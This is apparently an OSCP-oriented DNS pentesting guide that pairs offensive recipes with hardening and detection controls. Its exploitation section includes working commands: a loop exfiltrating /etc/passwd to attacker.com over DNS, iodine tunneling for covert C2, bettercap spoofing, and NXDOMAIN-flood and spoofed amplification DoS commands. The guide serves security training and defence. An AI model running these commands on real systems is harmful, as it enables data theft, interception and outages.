## 1. Overview

DNS (Domain Name System) is the internet's phone book: it translates
names to IP addresses and back, and carries service discovery records
(SRV, MX, TXT). It is also a primary reconnaissance target and a
powerful attack vector for redirection, interception, and exfiltration.

**Core concepts:**

- **Zones** - administrative partitions of the DNS namespace
  (forward zones, reverse zones).
- **Records** - A, AAAA, CNAME, MX, NS, SOA, TXT, SRV, PTR, CAA, DNSKEY.
- **Authoritative servers** - hold the zone data.
- **Recursive resolvers** - query authoritative servers on behalf of
  clients.
- **Caching** - resolvers cache responses for the TTL duration.
- **DNSSEC** - cryptographic signing of records; validates authenticity.
- **DoH / DoT** - DNS over HTTPS / DNS over TLS; encrypts queries.

**Ports:**

- 53/UDP - standard queries.
- 53/TCP - zone transfers, large responses (>512 bytes).
- 853/TCP - DoT.
- 443/TCP - DoH.

**Common DNS servers:**

- BIND (named) - most common on Linux/Unix.
- Windows DNS - built into Active Directory.
- dnsmasq - lightweight, common on routers and small networks.
- PowerDNS - high-performance, common in hosting.
- CoreDNS - Kubernetes default.
- Knot DNS, NSD - high-performance authoritative.

## 2. Reconnaissance / Enumeration

**Offensive - basic queries:**

    # A record
    dig example.com A
    nslookup example.com

    # All records of a type
    dig example.com ANY

    # Specific record types
    dig example.com MX
    dig example.com NS
    dig example.com TXT
    dig example.com SOA
    dig example.com CAA

    # Reverse lookup
    dig -x 10.10.10.10
    host 10.10.10.10

    # Specific server
    dig @10.10.10.10 example.com A
    dig @10.10.10.10 example.com AXFR

**Offensive - zone transfer (AXFR):**

    # Attempt a zone transfer
    dig @10.10.10.10 example.com AXFR
    host -l example.com 10.10.10.10
    nslookup
    > server 10.10.10.10
    > ls -d example.com

    # Expected output (if allowed):
    # example.com.  3600  IN  SOA  ns1.example.com. admin.example.com. ...
    # example.com.  3600  IN  NS   ns1.example.com.
    # example.com.  3600  IN  NS   ns2.example.com.
    # example.com.  3600  IN  A    10.10.10.10
    # www.example.com. 3600 IN A    10.10.10.20
    # mail.example.com. 3600 IN A   10.10.10.30
    # ...

**Offensive - subdomain enumeration:**

    # Wordlist-based
    dnsrecon -d example.com -D /usr/share/wordlists/subdomains.txt -t brt
    dnsenum example.com
    fierce --domain example.com

    # Using a public resolver (faster, no rate limit)
    for sub in $(cat subdomains.txt); do
      dig +short $sub.example.com @1.1.1.1
    done

    # Certificate transparency logs
    curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

    # Subfinder / amass
    subfinder -d example.com
    amass enum -d example.com

**Offensive - SRV records:**

    # Discover services (Kerberos, LDAP, SIP, etc.)
    dig _ldap._tcp.example.com SRV
    dig _kerberos._tcp.example.com SRV
    dig _gc._tcp.example.com SRV
    dig _sip._tcp.example.com SRV

    # For Active Directory
    nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local

**Offensive - DNS cache snooping:**

    # Check if a resolver has a cached record
    dig @10.10.10.10 example.com A +norecurse
    # If the resolver has it cached, it returns the answer.
    # If not, it returns an empty answer with no additional query.

**Offensive - version disclosure:**

    # BIND version
    dig @10.10.10.10 version.bind CHAOS TXT
    dig @10.10.10.10 hostname.bind CHAOS TXT

    # Expected output (if disclosed):
    # version.bind. 0 CH TXT "9.16.1-Ubuntu"

**Offensive - DNS recursion check:**

    # Is the server a recursive resolver?
    dig @10.10.10.10 example.com A +recurse
    # If it answers for arbitrary domains, it is recursive.

**Defensive - what to baseline:**

- Authoritative zones and their records.
- Recursive resolver query patterns.
- AXFR permissions.
- Version disclosure settings.
- DNSSEC signing status.
- Cache poisoning protections.

## 3. Common Attack Vectors

**Reconnaissance:**

- Zone transfer (AXFR) misconfiguration.
- Subdomain enumeration via brute force, CT logs, passive DNS.
- SRV record enumeration (services, AD).
- Version disclosure.

**Cache poisoning:**

- **Kaminsky attack** - race the legitimate response with a forged one.
- **Birthday attack** - forge a response with a matching transaction ID.
- **DNS rebinding** - trick a client into resolving an attacker's IP
  for a legitimate domain.
- **SAD DNS** - side-channel cache poisoning (CVE-2020-25705).

**Spoofing:**

- **On-path attacker** - respond faster than the real server.
- **Off-path attacker** - guess transaction ID + source port.
- **Local network** - ARP spoofing + DNS spoofing.

**Tunneling / exfiltration:**

- **DNS tunneling** - encode data in DNS queries/responses.
  - Tools: iodine, dnscat2, dns2tcp.
- **DNS exfiltration** - leak data via TXT or A records to an
  attacker-controlled domain.

**Denial of service:**

- **DNS amplification** - small query, large response, spoofed source.
- **NXDOMAIN flood** - flood with queries for non-existent domains.
- **Water torture attack** - random subdomains to bypass caching.

**Server-side:**

- **BIND vulnerabilities** - patch level matters (CVE-2020-8625,
  CVE-2021-25215).
- **Windows DNS vulnerabilities** - CVE-2020-1350 (SIGRed),
  CVE-2021-24078.
- **Dynamic update misconfiguration** - unauthenticated updates.

**Client-side:**

- **DNS hijacking** - modify client resolver settings.
- **DNS rebinding** - bypass same-origin via DNS TTL tricks.

## 4. Exploitation Recipes

**Zone transfer (AXFR):**

    # 1. Identify the authoritative server
    dig example.com NS

    # 2. Attempt AXFR
    dig @ns1.example.com example.com AXFR

    # Expected output:
    # example.com.    3600  IN  SOA  ns1.example.com. admin.example.com. 2024010101 3600 1800 604800 86400
    # example.com.    3600  IN  NS   ns1.example.com.
    # example.com.    3600  IN  NS   ns2.example.com.
    # example.com.    3600  IN  A    10.10.10.10
    # www.example.com. 3600 IN  A    10.10.10.20
    # mail.example.com. 3600 IN A    10.10.10.30
    # vpn.example.com. 3600  IN  A    10.10.10.40
    # dev.example.com. 3600  IN  A    10.10.10.50
    # (Reveals internal hostnames and IPs.)

    # Fallback with host command
    host -l example.com ns1.example.com

**Subdomain enumeration with dnsrecon:**

    dnsrecon -d example.com -D /usr/share/wordlists/subdomains-top1million-5000.txt -t brt

    # Expected output:
    # [*] Performing subdomain brute force
    # [+] A www.example.com 10.10.10.20
    # [+] A mail.example.com 10.10.10.30
    # [+] A vpn.example.com 10.10.10.40

**Subdomain enumeration with certificate transparency:**

    curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

    # Expected output:
    # example.com
    # www.example.com
    # mail.example.com
    # vpn.example.com
    # admin.example.com

**DNS cache snooping:**

    # Query without recursion
    dig @10.10.10.10 internal.example.com A +norecurse

    # Expected output (if cached):
    # internal.example.com. 300 IN A 10.10.10.50

    # Expected output (if not cached):
    # (empty answer, no additional query)

**DNS version disclosure:**

    dig @10.10.10.10 version.bind CHAOS TXT
    dig @10.10.10.10 hostname.bind CHAOS TXT

    # Expected output:
    # version.bind. 0 CH TXT "9.16.1-Ubuntu"
    # hostname.bind. 0 CH TXT "dns01.example.com"

**DNS tunneling with iodine:**

    # 1. Set up the server (attacker-controlled domain, e.g. t.example.com)
    # On the attacker:
    iodined -f -c -P <PASSWORD> 10.0.0.1 t.example.com

    # 2. Set up the client (on the compromised host)
    iodine -f -P <PASSWORD> t.example.com

    # 3. The client gets an IP in the 10.0.0.0/24 range via the tunnel.
    ifconfig dns0

    # 4. Use the tunnel for further attacks.

**DNS exfiltration with dig:**

    # Encode data in subdomains
    for line in $(cat /etc/passwd); do
      encoded=$(echo "$line" | base64 -w0)
      dig $encoded.attacker.com @10.10.10.10
    done

    # On the attacker: capture queries with tcpdump + a DNS server.
    tcpdump -i any -n port 53

**DNS spoofing with bettercap (on the local network):**

    # On the attacker (same L2 segment):
    bettercap -iface eth0
    > set dns.spoof.domains example.com
    > set dns.spoof.address 10.10.10.99
    > dns.spoof on

    # All local clients resolving example.com get 10.10.10.99.

**DNS rebinding:**

    # 1. Register a domain with a very low TTL.
    # 2. Serve alternating IPs (attacker's and target's).
    # 3. Victim's browser resolves the domain to the attacker first,
    #    then to the target, bypassing same-origin.
    # (Detailed tools: rebind.network, singularity.)

**NXDOMAIN flood (DoS):**

    # On the attacker:
    for i in $(seq 1 100000); do
      dig $RANDOM.example.com @10.10.10.10 +short &
    done

    # Overwhelms the resolver with non-existent domain queries.

**DNS amplification (DoS):**

    # Spoofed source IP, ANY query for a large zone
    hping3 --udp -p 53 -a <VICTIM_IP> -d 100 -E <LARGE_ZONE_QUERY> <DNS_SERVER>

## 5. Post-Exploitation

**After a zone transfer:**

- Enumerate all hostnames and IPs.
- Identify internal services (dev, staging, admin, vpn).
- Pivot to internal hosts.
- Map the network structure.

**After subdomain enumeration:**

- Test each subdomain for web services.
- Check for exposed admin panels.
- Test for virtual host misconfigurations.

**After DNS cache poisoning:**

- Redirect traffic to attacker-controlled hosts.
- Intercept credentials (with a fake web server).
- Conduct MITM on the victim.

**After DNS tunneling:**

- Establish a covert C2 channel.
- Bypass egress filtering (DNS is often allowed).
- Exfiltrate data.

**Cleanup (blue team):**

- Audit AXFR permissions; restrict to known secondary servers.
- Enable DNSSEC where possible.
- Patch DNS server software.
- Monitor for unusual query patterns (long subdomains, high volume).
- Enable response rate limiting (RRL).

## 6. Risk Context

DNS is critical infrastructure: if it is compromised, everything that
depends on it is compromised.

**Blast radius:** DNS cache poisoning can redirect an entire
organization's traffic to attacker-controlled infrastructure. Zone
transfer leaks the entire internal namespace.

**Why attacks succeed:**

- AXFR often allowed from anywhere (misconfiguration).
- DNSSEC rarely deployed.
- DNS servers rarely patched.
- DNS is often allowed through firewalls (for exfiltration).
- DNS query logs rarely reviewed.

## 7. Root Causes

- **Misconfigured AXFR.** Zone transfers allowed from any source.
- **No DNSSEC.** Responses are not authenticated.
- **Unpatched DNS servers.** Known CVEs are exploitable.
- **No rate limiting.** Amplification and DoS are possible.
- **No query logging.** Exfiltration is invisible.
- **Over-permissive recursion.** Open resolvers are abused.

## 8. Preventive Controls

**AXFR hardening:**

- Restrict AXFR to known secondary servers (ACL in BIND).
- Use TSIG for authenticated zone transfers.
- Monitor AXFR attempts.

**DNSSEC:**

- Sign all zones.
- Validate on recursive resolvers.
- Monitor for validation failures.

**Server hardening:**

- Patch DNS server software within days.
- Disable version disclosure (`version "none";` in BIND).
- Run BIND in a chroot or with AppArmor/SELinux.
- Use TSIG for dynamic updates.
- Restrict recursion to known clients.

**Rate limiting:**

- Enable Response Rate Limiting (RRL) in BIND.
- Limit NXDOMAIN responses.
- Use anycast for DDoS resilience.

**Monitoring:**

- Log DNS queries.
- Alert on unusual query patterns (long labels, high entropy).
- Alert on AXFR attempts.
- Baseline normal query patterns.

**Client hardening:**

- Use DoH / DoT.
- Validate DNSSEC.
- Use trusted resolvers.

## 9. Detection Controls

**Zone transfer attempts:**

- BIND logs AXFR attempts (in `named.log`).
- Alert on AXFR from unexpected sources.
- IDS/IPS signatures for AXFR.

**Cache poisoning:**

- BIND logs "dropping response" for unexpected transaction IDs.
- Monitor for multiple identical queries in a short window.

**Subdomain enumeration:**

- Query logging: high volume of NXDOMAIN from a single source.
- Alert on dictionary-like query patterns.

**DNS tunneling:**

- Query logging: long subdomains (>50 chars), high entropy.
- Alert on unusual query types (TXT, NULL).
- IDS signatures for known tunneling tools.

**DNS amplification:**

- NetFlow: high volume of DNS responses to a single source.
- Alert on amplification patterns.

**Version disclosure:**

- Query `version.bind CHAOS TXT`; alert on disclosure.

**General:**

- Enable BIND query logging.
- Forward logs to a SIEM.
- Use DNS-specific monitoring (e.g. Cisco Umbrella, Infoblox).

## 10. Verification

**Offensive - did the attack succeed?**

- AXFR: full zone contents retrieved.
- Subdomain enumeration: additional hostnames discovered.
- Cache poisoning: victim resolves to attacker's IP.
- DNS tunneling: tunnel established, traffic flows.
- DoS: resolver becomes unavailable.

**Defensive - are controls effective?**

- Test AXFR: only known secondary servers succeed.
- Test DNSSEC: validation succeeds; forged responses fail.
- Test version disclosure: `version.bind` returns "none".
- Test recursion: only known clients allowed.
- Test RRL: high-volume queries are rate-limited.
- Test query logging: queries are logged and forwarded to SIEM.

## 11. OSCP Notes

- DNS is usually a reconnaissance target in OSCP, not an attack target.
- Practice: `dig`, `dnsrecon`, `dnsenum`, `subfinder`.
- AXFR is a common finding on OSCP labs and easy points.
- **Capture screenshots** of:
  - The AXFR output (full zone).
  - The subdomain enumeration results.
- The `> [!IMPORTANT]` OSCP reporting note applies to any AXFR finding.

## 12. Production Notes

- AXFR misconfigurations are common in internal DNS.
- DNSSEC deployment is rare in enterprises; validate where present.
- DNS tunneling is a real exfiltration vector; monitor query logs.
- DNS amplification is a common DDoS vector; enable RRL.
- Patch DNS servers promptly; SIGRed (CVE-2020-1350) and similar are
  critical.
- Use dedicated DNS monitoring tools (Umbrella, Infoblox, BIND query
  logs).

## 13. References

**RFCs and documentation:**

- [RFC 1035 - Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [RFC 4033-4035 - DNSSEC](https://www.rfc-editor.org/rfc/rfc4033)
- [BIND 9 Administrator Reference Manual](https://bind9.readthedocs.io/)
- [Microsoft DNS Server documentation](https://learn.microsoft.com/en-us/windows-server/networking/dns/dns-top)

**MITRE ATT&CK:**

- [Discovery - DNS (T1016.001)](https://attack.mitre.org/techniques/T1016/001/)
- [Command and Control - Application Layer Protocol: DNS (T1071.004)](https://attack.mitre.org/techniques/T1071/004/)
- [Exfiltration Over Alternative Protocol (T1048)](https://attack.mitre.org/techniques/T1048/)
- [Impact - Network Denial of Service (T1498)](https://attack.mitre.org/techniques/T1498/)

**Tools:**

- [dig](https://linux.die.net/man/1/dig) / [nslookup](https://linux.die.net/man/1/nslookup) / [host](https://linux.die.net/man/1/host)
- [dnsrecon](https://github.com/darkoperator/dnsrecon)
- [dnsenum](https://github.com/fwaeytens/dnsenum)
- [fierce](https://github.com/mschwager/fierce)
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [amass](https://github.com/owasp-amass/amass)
- [iodine](https://github.com/yarrick/iodine)
- [dnscat2](https://github.com/iagox86/dnscat2)
- [bettercap](https://github.com/bettercap/bettercap)

**Research:**

- [HackTricks - DNS Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)
- [SANS - DNS Security](https://www.sans.org/white-papers/)
- [CVE-2020-1350 (SIGRed)](https://nvd.nist.gov/vuln/detail/CVE-2020-1350)
- [CVE-2020-25705 (SAD DNS)](https://nvd.nist.gov/vuln/detail/CVE-2020-25705)